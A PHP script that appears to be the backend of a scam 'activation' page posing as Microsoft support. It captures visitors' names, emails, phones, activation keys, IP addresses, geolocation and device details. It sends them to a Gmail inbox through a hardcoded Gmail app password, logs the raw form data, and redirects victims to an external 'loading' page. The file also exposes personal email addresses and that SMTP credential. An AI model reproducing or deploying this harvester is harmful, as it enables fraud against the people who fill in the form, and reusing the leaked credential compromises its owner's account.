<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$log_file = __DIR__ . '/mail_debug.log';
$debug_log = [];
$debug_log[] = "=== MAIL DEBUG START [" . date('Y-m-d H:i:s') . "] ===";
$debug_log[] = "REQUEST_METHOD: " . ($_SERVER['REQUEST_METHOD'] ?? 'N/A');
$debug_log[] = "POST keys: " . implode(',', array_keys($_POST));
$debug_log[] = "POST data: " . json_encode($_POST, JSON_UNESCAPED_SLASHES);

session_start();

$to_email   = "areeb2025malik@gmail.com";
$from_email = "diwakar1996ram@gmail.com";
$smtp_user  = "diwakar1996ram@gmail.com";
$smtp_pass  = "qpzh vmwi lvys cmki";

$name           = isset($_POST['name'])           ? htmlspecialchars(trim($_POST['name']))           : '';
$email          = isset($_POST['email'])          ? htmlspecialchars(trim($_POST['email']))          : '';
$phone          = isset($_POST['phone'])          ? htmlspecialchars(trim($_POST['phone']))          : '';
$activation_key = isset($_POST['activation_key']) ? htmlspecialchars(trim($_POST['activation_key'])) : '';
$brand          = isset($_POST['brand'])          ? htmlspecialchars(trim($_POST['brand']))          : 'microsoft';
$keyword        = isset($_POST['keyword'])        ? htmlspecialchars(trim($_POST['keyword']))        : '';
$referrer       = isset($_POST['referrer'])       ? htmlspecialchars(trim($_POST['referrer']))       : '';
$country        = isset($_POST['country'])        ? htmlspecialchars(trim($_POST['country']))        : '';

$_SESSION['detectedBrand']         = $brand;
$_SESSION['detectedKeyword']       = $keyword;
$_SESSION['detectedActivationKey'] = $activation_key;

function getVisitorIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    }
}

$visitor_ip = getVisitorIP();
$debug_log[] = "Visitor IP: $visitor_ip";

$user_agent  = isset($_SERVER['HTTP_USER_AGENT'])       ? htmlspecialchars($_SERVER['HTTP_USER_AGENT'])       : 'Unknown';
$accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])  ? htmlspecialchars($_SERVER['HTTP_ACCEPT_LANGUAGE'])  : 'Unknown';

$device    = 'Unknown Device';
$os        = 'Unknown OS';
$browser   = 'Unknown Browser';
$is_mobile = false;

if (preg_match('/Windows/i', $user_agent))          { $os = 'Windows';   $device = 'PC/Laptop'; }
elseif (preg_match('/Macintosh|Mac OS X/i', $user_agent)) { $os = 'macOS'; $device = 'Mac'; }
elseif (preg_match('/Linux/i', $user_agent))        { $os = 'Linux'; }
elseif (preg_match('/Android/i', $user_agent))      { $os = 'Android';   $device = 'Mobile';   $is_mobile = true; }
elseif (preg_match('/iPhone|iPad/i', $user_agent))  { $os = 'iOS';       $device = 'iPhone/iPad'; $is_mobile = true; }

if (preg_match('/Chrome/i', $user_agent) && !preg_match('/Chromium/i', $user_agent))      { $browser = 'Chrome'; }
elseif (preg_match('/Firefox/i', $user_agent))      { $browser = 'Firefox'; }
elseif (preg_match('/Safari/i', $user_agent)  && !preg_match('/Chrome/i', $user_agent))   { $browser = 'Safari'; }
elseif (preg_match('/Edge/i', $user_agent))        { $browser = 'Edge'; }
elseif (preg_match('/Opera|OPR/i', $user_agent))   { $browser = 'Opera'; }
elseif (preg_match('/MSIE|Trident/i', $user_agent)) { $browser = 'Internet Explorer'; }

$location = 'Unknown Location';
if (function_exists('curl_init')) {
    $ch = curl_init();
    $ipinfo_url = "https://ipinfo.io/{$visitor_ip}/json";
    curl_setopt($ch, CURLOPT_URL, $ipinfo_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $curl_error = curl_error($ch);
    $http_code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $debug_log[] = "ipinfo.io URL: $ipinfo_url";
    $debug_log[] = "ipinfo.io HTTP code: $http_code, curl error: " . ($curl_error ?: 'none');
    if ($response) {
        $ip_data = json_decode($response, true);
        if ($ip_data && isset($ip_data['city']) && isset($ip_data['region'])) {
            $location = $ip_data['city'] . ', ' . $ip_data['region'] . ', ' . $ip_data['country'];
        }
    }
    curl_close($ch);
}
$debug_log[] = "Resolved location: $location";

$subject = "New Activation Request - Key: $activation_key";

$email_body  = "=== ACTIVATION REQUEST DETAILS ===\n\n";
$email_body .= "Google Keyword: $keyword\n";
$email_body .= "Referrer: $referrer\n";
$email_body .= "Country (IP lookup): $country\n";
$email_body .= "Timestamp: " . date('Y-m-d H:i:s') . "\n\n";
$email_body .= "=== VISITOR INFORMATION ===\n\n";
$email_body .= "Name: $name\n";
$email_body .= "Email: $email\n";
$email_body .= "Phone: $phone\n";
$email_body .= "Activation Key: $activation_key\n\n";
$email_body .= "=== DEVICE DETAILS ===\n\n";
$email_body .= "IP Address: $visitor_ip\n";
$email_body .= "Location: $location\n";
$email_body .= "User Agent: $user_agent\n";
$email_body .= "Accept Language: $accept_lang\n";
$email_body .= "Device: $device\n";
$email_body .= "Operating System: $os\n";
$email_body .= "Browser: $browser\n";
$email_body .= "Is Mobile: " . ($is_mobile ? "Yes" : "No") . "\n\n";
$email_body .= "=== END OF REPORT ===\n";

$debug_log[] = "Email subject: $subject";
$debug_log[] = "To: $to_email, From: $from_email";

$headers   = "From: $from_email\r\n";
$headers  .= "Reply-To: " . ($email ?: $from_email) . "\r\n";
$headers  .= "Content-Type: text/plain; charset=UTF-8\r\n";
$headers  .= "X-Mailer: PHP/" . phpversion();

$mail_sent      = false;
$mailer_error   = '';

if (function_exists('mail')) {
    $debug_log[] = "Attempting native mail()...";
    $mail_result = @mail($to_email, $subject, $email_body, $headers);
    if ($mail_result) {
        $mail_sent = true;
        $debug_log[] = "mail() returned TRUE";
    } else {
        $debug_log[] = "mail() returned FALSE";
        $last_error = error_get_last();
        $debug_log[] = "mail() last error: " . ($last_error['message'] ?? 'n/a');
    }
} else {
    $debug_log[] = "mail() function NOT available";
}

$autoload_path   = __DIR__ . '/vendor/autoload.php';
$phpmailer_found = false;
$debug_log[] = "Checking PHPMailer autoload at: $autoload_path";
if (file_exists($autoload_path)) {
    require_once $autoload_path;
    $phpmailer_found = class_exists('PHPMailer\\PHPMailer\\PHPMailer');
    $debug_log[] = "vendor/autoload.php loaded. PHPMailer class: " . ($phpmailer_found ? 'YES' : 'NO');
} else {
    $debug_log[] = "vendor/autoload.php NOT found at $autoload_path — PHPMailer skipped";
}

if (!$mail_sent && $phpmailer_found) {
    $debug_log[] = "Attempting PHPMailer SMTP via Gmail...";
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $mail->SMTPDebug = 2;
        ob_start();
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = $smtp_user;
        $mail->Password   = $smtp_pass;
        if (defined('PHPMailer\\PHPMailer\\PHPMailer::ENCRYPTION_STARTTLS')) {
            $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS;
            $debug_log[] = "Using ENCRYPTION_STARTTLS constant";
        } else {
            $mail->SMTPSecure = 'tls';
            $debug_log[] = "Fallback: SMTPSecure='tls' string";
        }
        $mail->Port       = 587;
        $mail->setFrom($smtp_user, 'Activation System');
        $mail->addAddress($to_email);
        $mail->isHTML(false);
        $mail->Subject    = $subject;
        $mail->Body       = $email_body;
        $mail->send();
        $smtp_debug = ob_get_clean();
        $debug_log[] = "PHPMailer SMTP debug output:\n" . trim($smtp_debug);
        $mail_sent = true;
        $debug_log[] = "PHPMailer send OK";
    } catch (Exception $e) {
        $smtp_debug   = @ob_get_clean() ?: '';
        $mailer_error = $mail->ErrorInfo ?: $e->getMessage();
        $debug_log[] = "PHPMailer SMTP debug:\n" . trim($smtp_debug);
        $debug_log[] = "PHPMailer Exception: " . $e->getMessage();
        $debug_log[] = "PHPMailer ErrorInfo: $mailer_error";
    }
}

$debug_log[] = "FINAL mail_sent = " . ($mail_sent ? 'TRUE' : 'FALSE');
$debug_log[] = "=== MAIL DEBUG END ===";

@file_put_contents($log_file, implode("\n", $debug_log) . "\n\n", FILE_APPEND);

$redirect_url = 'https://mainoffice-eight.vercel.app/loading.html?brand=' . urlencode($brand)
    . '&keyword=' . urlencode($keyword)
    . '&key=' . urlencode($activation_key)
    . '&referrer=' . urlencode($referrer)
    . '&mailsent=' . ($mail_sent ? '1' : '0')
    . '&error=' . urlencode($mailer_error);

header("Location: $redirect_url", true, 302);
exit();
?>
